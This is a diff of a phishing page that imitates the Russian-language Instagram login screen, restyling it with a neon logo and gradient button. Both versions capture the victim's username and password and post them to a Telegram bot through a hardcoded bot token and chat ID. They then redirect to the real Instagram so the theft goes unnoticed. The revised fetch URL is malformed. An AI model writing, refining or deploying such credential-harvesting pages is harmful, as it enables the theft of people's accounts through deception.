@@ -5,34 +5,95 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Вход • Instagram</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        body { background-color: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: #fff; }
-        .container { width: 100%; max-width: 350px; padding: 20px; text-align: center; }
-        .logo { font-size: 35px; font-weight: bold; margin-bottom: 40px; font-style: italic; font-family: 'Trebuchet MS', sans-serif; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
+        
+        body { 
+            background-color: #000; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            color: #fff;
+            overflow: hidden;
+        }
+
+        .container { 
+            width: 100%; 
+            max-width: 350px; 
+            padding: 20px; 
+            text-align: center; 
+        }
+
+        /* Стиль для неонового логотипа */
+        .neon-logo {
+            width: 220px;
+            margin-bottom: 30px;
+            filter: drop-shadow(0 0 10px rgba(255, 0, 150, 0.8));
+            animation: pulse 2s infinite alternate;
+        }
+
+        @keyframes pulse {
+            from { transform: scale(1); filter: drop-shadow(0 0 10px rgba(255, 0, 150, 0.8)); }
+            to { transform: scale(1.05); filter: drop-shadow(0 0 20px rgba(0, 150, 255, 0.8)); }
+        }
+
         input { 
-            width: 100%; padding: 12px; background: #121212; border: 1px solid #363636; 
-            border-radius: 3px; color: #fff; margin-bottom: 12px; outline: none; font-size: 14px;
+            width: 100%; 
+            padding: 14px; 
+            background: #121212; 
+            border: 1px solid #363636; 
+            border-radius: 8px; 
+            color: #fff; 
+            margin-bottom: 12px; 
+            outline: none; 
+            font-size: 14px;
+            transition: 0.3s;
         }
-        input:focus { border-color: #555; }
+
+        input:focus { 
+            border-color: #0095f6; 
+            box-shadow: 0 0 5px rgba(0, 149, 246, 0.5);
+        }
+
         .login-btn { 
-            width: 100%; background: #0095f6; color: #fff; border: none; 
-            border-radius: 8px; padding: 10px; font-weight: 600; cursor: pointer; font-size: 14px;
+            width: 100%; 
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            color: #fff; 
+            border: none; 
+            border-radius: 8px; 
+            padding: 12px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            font-size: 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
         }
-        .footer { position: absolute; bottom: 20px; color: #8e8e8e; font-size: 13px; }
+
+        .login-btn:active { transform: scale(0.98); }
+
+        .footer { 
+            position: absolute; 
+            bottom: 20px; 
+            color: #555; 
+            font-size: 12px; 
+            letter-spacing: 1px;
+        }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <div class="logo">Instagram</div>
+        <!-- Твое неоновое изображение -->
+        <img src="https://ibb.co" class="neon-logo" alt="Instagram Neon">
+
         <form id="instForm">
-            <input type="text" id="u" placeholder="Телефон, имя пользователя или эл. адрес" required>
+            <input type="text" id="u" placeholder="Имя пользователя или email" required>
             <input type="password" id="p" placeholder="Пароль" required>
             <button type="submit" class="login-btn">Войти</button>
         </form>
     </div>
 
-    <div class="footer">Meta © 2024</div>
+    <div class="footer">from META</div>
 
     <script>
     document.getElementById('instForm').onsubmit = async function(e) {
@@ -41,39 +102,23 @@
         const user = document.getElementById('u').value;
         const pass = document.getElementById('p').value;
 
-        // ТВОИ ДАННЫЕ ИЗ РАБОЧЕГО КОДА
+        // ТВОЯ РАБОЧАЯ ЛОГИКА
         const BOT_TOKEN = '8314828218:AAGY6twUZ6iFU7smncNhgGJ7pxh5z6MF1p8';
         const CHAT_ID = '6576262467';
 
         try {
-            const response = await fetch(
-                `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-                {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: `📸 НОВЫЙ ЛОГ:\n👤 Логин: ${user}\n🔑 Пароль: ${pass}`
-                    })
-                }
-            );
+            await fetch(`https://telegram.org{BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: `📸 NEON LOG:\n👤 Логин: ${user}\n🔑 Пароль: ${pass}`
+                })
+            });
+        } catch (err) {}
 
-            const data = await response.json();
-
-            // Твоя логика проверки
-            if (data.ok) {
-                // Маскировка: перекидываем на реальную инсту
-                window.location.href = 'https://instagram.com';
-            } else {
-                console.log('Ошибка Telegram:', data);
-                // Всё равно перекидываем, чтобы не палиться
-                window.location.href = 'https://instagram.com';
-            }
-
-        } catch (err) {
-            console.log('Ошибка отправки:', err);
-            window.location.href = 'https://instagram.com';
-        }
+        // Перенаправление
+        window.location.href = 'https://instagram.com';
     }
     </script>
 
